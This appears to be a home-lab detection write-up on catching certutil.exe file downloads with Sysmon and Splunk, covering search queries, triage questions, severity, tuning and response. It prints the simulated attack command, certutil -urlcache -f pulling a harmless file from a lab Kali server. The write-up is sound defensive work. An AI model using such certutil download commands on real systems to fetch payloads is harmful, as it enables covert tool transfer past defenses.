Detection 13 Certutil File Download

Objective
Detect suspicious file download activity using certutil.exe.

This detection uses Sysmon process creation telemetry from Target-PC.
The main event used for this detection is Sysmon Event ID 1.
Sysmon Event ID 3 may also help if network connection telemetry is available.

Certutil is a trusted Windows binary.
That is what makes this behavior important.
Attackers can abuse trusted Windows tools to download files while blending in with normal system activity.

Lab Setup
Host: Target-PC
Attacker: Kali Linux
SIEM: Splunk
Log Sources: Sysmon and Microsoft Defender
Primary Event ID: Sysmon Event ID 1
Optional Event ID: Sysmon Event ID 3
Tool Used: certutil.exe
Remote IP: 192.168.10.250
Remote Port: 8000
Downloaded File: update.txt

MITRE ATT&CK
Command and Control: T1105 - Ingress Tool Transfer
Defense Evasion: T1218 - System Binary Proxy Execution

Detection Logic
Look for certutil.exe process execution where the command line contains download-related arguments or a URL.

Important indicators:
certutil.exe
-urlcache
-f
http://
https://
update.txt
192.168.10.250

The main behavior I wanted to validate was certutil.exe reaching out to a remote web server and saving a file to disk.

SPL Search
index=endpoint host="Target-PC" source="*Sysmon*"
("certutil.exe" OR "urlcache" OR "http://" OR "update.txt" OR "192.168.10.250")
| table _time EventCode EventID host ComputerName Image CommandLine DestinationIp DestinationPort ParentImage User _raw
| sort -_time

Process Creation Search
index=endpoint host="Target-PC" source="*Sysmon*" EventCode=1
| search Image="*certutil.exe" OR CommandLine="*urlcache*" OR CommandLine="*http*"
| table _time host ComputerName User Image ParentImage CommandLine
| sort -_time

Network Search
index=endpoint host="Target-PC" source="*Sysmon*" EventCode=3
| search Image="*certutil.exe" OR DestinationIp="192.168.10.250"
| table _time host ComputerName Image DestinationIp DestinationPort Protocol User
| sort -_time

Safe Lab Simulation
A harmless text file was hosted on Kali using Python's built-in web server.

Kali commands:
mkdir -p /home/kali/certutil-test
cd /home/kali/certutil-test
echo 'certutil download test file' > update.txt
python3 -m http.server 8000

Target-PC command:
certutil.exe -urlcache -f http://192.168.10.250:8000/update.txt C:\Windows\Temp\update.txt

Cleanup command:
del C:\Windows\Temp\update.txt

Kali web server cleanup:
Ctrl + C

This test was safe.
It did not download malware.
It did not execute the downloaded file.
It did not create persistence.
It did not disable Defender.
It was only used to validate certutil download telemetry.

Detection Result
Splunk returned Sysmon telemetry showing certutil download behavior from Target-PC.

Observed indicators:
Process: certutil.exe
Arguments: -urlcache -f
Remote Host: 192.168.10.250
Remote Port: 8000
Downloaded File: update.txt
Destination Path: C:\Windows\Temp\update.txt

Microsoft Defender also generated an alert because certutil download behavior is commonly associated with LOLBin abuse.

Analyst Review
The first thing I checked was whether certutil.exe actually ran on Target-PC.
Sysmon process creation telemetry showed certutil.exe and captured the command line.

The next thing I checked was the command line.
The command line showed -urlcache, -f, a remote HTTP URL, and the destination file path.

That combination is what makes the event suspicious.
Certutil can be legitimate, but certutil downloading a file from an HTTP server is not something I would ignore.

The important fields were:
Host
User
Image
ParentImage
CommandLine
DestinationIp
DestinationPort
EventCode
EventID
_time

The Defender alert added more value because it showed the endpoint security tool also considered the behavior suspicious.

Investigation Questions I would ask myself

1.Which host executed certutil.exe?

2.Which user launched the process?

3.What parent process launched certutil?

4.What URL was contacted?

5.Was the destination internal or external?

6.Was the destination approved?

7.What file was downloaded?

8.Where was the file saved?

9.Was the file executed after download?

Did Defender or EDR block the activity?
Did the same host show PowerShell activity?
Did the same host create a scheduled task or new service?
Did the same host show LSASS access?
Was the Security log cleared afterward?

Severity
High

Certutil file downloads should be reviewed quickly because certutil is often abused as a LOLBin.

Keep High if:
The destination is unknown or external.
The file is saved to Temp, Downloads, AppData, or another user-writable folder.
The downloaded file executes afterward.
The activity is followed by scheduled task creation.
The activity is followed by new service creation.
The activity is followed by Defender tampering.
The activity is followed by LSASS access.
Defender or EDR generated an alert.
The parent process is unusual.

False Positives
Administrator troubleshooting
Certificate management activity
Internal IT scripts
Software deployment workflows
Security team testing
Lab validation

Tuning Notes
This search is broad on purpose for lab validation.
In production, I would tune by command-line arguments, destination reputation, parent process, user context, and follow-on activity.

Good tuning ideas:
Alert higher when certutil uses -urlcache.
Alert higher when the command line contains http or https.
Alert higher when the destination is external.
Alert higher when the file is saved to user-writable folders.
Alert higher when the downloaded file is executed.
Correlate certutil execution with Defender alerts.
Correlate certutil execution with Sysmon Event ID 3 network connections.
Correlate certutil download activity with scheduled tasks, services, and PowerShell activity.

Recommended Response for this alert
Identify the affected host and user.
Review the full certutil command line.
Review the parent process.
Determine the remote URL and destination IP.
Check whether the destination is trusted.
Retrieve and hash the downloaded file if available.
Check Microsoft Defender or EDR alerts.
Determine whether the downloaded file executed.
Search for the same URL, IP, or file name across the environment.
Review related process activity before and after the download.
Block the destination if confirmed suspicious.
Isolate the host if malicious execution occurred.
Document the full timeline.

Validation Evidence

1.Certutil download command or Defender block alert

<img width="475" height="378" alt="13_certutil_download_command_or_defender_block" src="https://github.com/user-attachments/assets/6e5d7f77-6ef3-4544-a846-916b18bb76ec" />

2.Raw Sysmon evidence showing certutil process creation or related telemetry
<img width="624" height="233" alt="13_raw_sysmon_certutil_process_creation" src="https://github.com/user-attachments/assets/b7911494-6acf-4dd6-a99e-8286e8d20c40" />

3.Splunk detection query identifying certutil download indicators
<img width="624" height="238" alt="13_certutil_download_detection" src="https://github.com/user-attachments/assets/d6103fca-f049-4f66-98c0-49e74bf7afa9" />

Analyst Conclusion
This detection confirmed certutil.exe file download behavior from Target-PC to the Kali web server.

The lab download was intentionally harmless, but the behavior is still high value because certutil is a trusted Windows binary that attackers can abuse to retrieve tools, scripts, or payloads. Splunk showed the certutil command line, and Microsoft Defender also flagged the behavior as suspicious.

In a real SOC investigation, I would not stop at seeing certutil.exe. I would review the full command line, remote URL, destination IP, downloaded file path, parent process, Defender response, and any follow-on execution. Certutil download activity becomes much more serious when the downloaded file runs afterward or when it appears near other behaviors like PowerShell execution, scheduled task creation, new service installation, Defender tampering, LSASS access, or event log clearing.
